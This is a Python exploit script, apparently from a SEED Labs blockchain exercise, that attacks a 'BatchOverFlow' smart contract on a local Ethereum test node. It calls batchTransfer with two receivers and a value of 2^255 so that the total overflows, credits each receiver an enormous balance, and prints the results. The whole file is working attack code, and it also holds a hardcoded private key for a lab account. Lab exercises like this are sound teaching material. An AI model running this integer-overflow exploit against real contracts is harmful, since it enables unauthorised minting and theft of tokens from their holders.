#!/usr/bin/env python3

from web3 import Web3
import sys
import os

# Add the shared folder to sys.path
sys.path.append(os.path.abspath("../shared"))

import SEEDWeb3

# Connect to the Geth PoA node
web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')

# Use account[1] as the attacker
private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"
attacker_account = web3.eth.account.from_key(private_key).address


# Load ABI and victim contract
abi_file    = "../contract/BatchOverFlow.abi"
victim_addr = 'put address here'

contract_abi = SEEDWeb3.getFileContent(abi_file)
contract = web3.eth.contract(address=victim_addr, abi=contract_abi)

# Prepare the overflow value (2^255)
overflow_value = 0x8000000000000000000000000000000000000000000000000000000000000000

# Prepare the receiver list (must be 2 addresses for cnt=2 to cause 2^256 overflow)
receivers = [web3.eth.accounts[0], web3.eth.accounts[1]]

# Send the transaction
print("Launching batchOverflow attack...")
nonce = web3.eth.get_transaction_count(attacker_account)

transaction = contract.functions.batchTransfer(receivers, overflow_value).build_transaction({
    'from': attacker_account,
    'nonce': nonce,
    'gas': 500000,  # adjust as needed
    'gasPrice': web3.to_wei('10', 'gwei'),
    'chainId': 1337  # replace with your chain ID
})

signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)


print("Transaction sent, waiting for block confirmation...")
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

print(f"✅ Attack completed. Transaction Hash: {tx_hash.hex()}")
print("📦 Transaction Receipt:")
print(tx_receipt)

# Check the Virtual balance of the receivers account after the attack
# Call the getBalance view function
balance_0 = contract.functions.getBalance(receivers[0]).call()
balance_1 = contract.functions.getBalance(receivers[1]).call()

# Print the balance
print("-\n----------------------------------------------------------")
print(f"Virtual Balance of {receivers[0]} in contract : {balance_0} wei ({web3.from_wei(balance_0, 'ether')} ETH)")
print(f"Virtual Balance of {receivers[1]} in contract : {balance_1} wei ({web3.from_wei(balance_1, 'ether')} ETH)")

